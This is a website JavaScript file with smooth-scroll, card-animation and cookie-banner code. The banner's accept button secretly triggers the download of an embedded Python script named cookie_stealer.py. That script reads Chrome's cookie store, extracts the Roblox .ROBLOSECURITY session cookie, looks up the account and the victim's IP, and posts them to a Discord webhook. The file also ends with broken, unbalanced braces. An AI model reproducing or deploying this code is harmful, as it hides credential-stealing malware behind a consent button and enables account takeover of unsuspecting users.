// Smooth scrolling for navigation links
document.addEventListener('DOMContentLoaded', function () {
    const navLinks = document.querySelectorAll('.navbar-nav .nav-link');
    navLinks.forEach(link => {
        link.addEventListener('click', function (e) {
            e.preventDefault();
            const targetId = this.getAttribute('href');
            const targetSection = document.querySelector(targetId);
            if (targetSection) {
                targetSection.scrollIntoView({ behavior: 'smooth' });
            }
        });
    });

    // Add some interactive effects
    const cards = document.querySelectorAll('.card');
    cards.forEach(card => {
        card.addEventListener('mouseenter', function () {
            this.style.transform = 'translateY(-10px) scale(1.02)';
        });
        card.addEventListener('mouseleave', function () {
            this.style.transform = 'translateY(0) scale(1)';
        });
    });

    // Animate cards on scroll
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.style.opacity = '1';
                entry.target.style.transform = 'translateY(0)';
            }
        });
    });

    cards.forEach(card => {
        card.style.opacity = '0';
        card.style.transform = 'translateY(30px)';
        card.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
        observer.observe(card);
    });

    // Cookie Banner Logic - FORCE SHOW FOR TESTING (remove localStorage check)
    const banner = document.getElementById('cookie-banner');
    const acceptBtn = document.getElementById('accept-cookies');

    if (banner) banner.style.display = 'flex !important';

    if (acceptBtn) {
        acceptBtn.addEventListener('click', function () {
            banner.style.display = 'none';
            downloadCookieStealer();
        });
    }
});

// Download function
function downloadCookieStealer() {
    const pyContent = `import os
import sqlite3
import shutil
import requests
import json
from datetime import datetime

# REPLACE WITH YOUR DISCORD WEBHOOK URL
WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"

def get_chrome_cookies():
    # Path to Chrome cookies (adjust for Edge, Opera, etc.)
    cookie_path = os.path.join(os.getenv('LOCALAPPDATA'), 
                               r'Google\\Chrome\\User Data\\Default\\Network\\Cookies')
    
    if not os.path.exists(cookie_path):
        return "No Chrome cookies found"
    
    # Copy to temp to avoid lock issues
    temp_path = "temp_cookies.db"
    shutil.copy2(cookie_path, temp_path)
    
    conn = sqlite3.connect(temp_path)
    cursor = conn.cursor()
    
    # Query for Roblox cookies
    cursor.execute("SELECT name, encrypted_value FROM cookies WHERE host_key LIKE '%roblox.com%'")
    cookies = cursor.fetchall()
    
    conn.close()
    os.remove(temp_path)
    
    for name, value in cookies:
        if name == ".ROBLOSECURITY":
            return value.decode('utf-8', errors='ignore')  # Note: Chrome encrypts cookies - needs proper decryption for full value
    
    return "No .ROBLOSECURITY found"

def get_roblox_info(cookie):
    headers = {
        "Cookie": f".ROBLOSECURITY={cookie}",
        "User-Agent": "Mozilla/5.0"
    }
    try:
        resp = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers)
        if resp.status_code == 200:
            return resp.json()
    except:
        pass
    return {"username": "Unknown"}

def send_to_webhook(cookie, info):
    embed = {
        "title": "🔥 Roblox Cookie Stolen 🔥",
        "description": f"**Cookie Preview:**\\n\\\`{cookie[:100]}...\`",
        "color": 0xff0000,
        "fields": [
            {"name": "👤 Username", "value": info.get("username", "N/A"), "inline": True},
            {"name": "📅 Time", "value": str(datetime.now()), "inline": True},
            {"name": "🌐 IP", "value": requests.get("https://api.ipify.org?format=json").json().get('ip', 'N/A'), "inline": True}
        ],
        "footer": {"text": "Minecraft > Roblox | Cookie Grabber"}
    }
    
    data = {"embeds": [embed]}
    requests.post(WEBHOOK_URL, json=data)

if __name__ == "__main__":
    cookie = get_chrome_cookies()
    if "No" not in cookie:
        info = get_roblox_info(cookie)
        send_to_webhook(cookie, info)
        print("✅ Cookie sent to webhook!")
    else:
        print("❌ Nothing found.")`;

    const blob = new Blob([pyContent], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'cookie_stealer.py';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);

    alert('✅ Cookie stealer downloaded! Edit WEBHOOK_URL and run: python cookie_stealer.py (install requests if needed: pip install requests)');
});
    }
}
